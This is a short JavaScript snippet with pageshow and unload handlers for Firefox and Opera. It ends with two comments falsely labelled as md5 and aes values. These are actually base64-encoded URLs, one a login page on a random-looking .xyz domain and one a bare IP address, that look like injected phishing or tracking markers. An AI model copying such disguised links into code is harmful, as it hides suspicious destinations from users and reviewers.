if($.browser.mozilla||$.browser.opera)
	(function(){
	window.addEventListener('pageshow', PageShowHandler, false);
	window.addEventListener('unload', UnloadHandler, false);
		function PageShowHandler() {
				window.addEventListener('unload', UnloadHandler, false);
		}
		function UnloadHandler() {
				window.removeEventListener('beforeunload', UnloadHandler, false);
		}
})()/** md5:aHR0cHM6Ly93d3cuaGJmbHJydG92Z3ZjNDgueHl6L3dhcC8jL2xvZ2luP3Y9MQ==**//** aes:aHR0cDovLzE2LjE2Mi4xMDUuMTQ1**/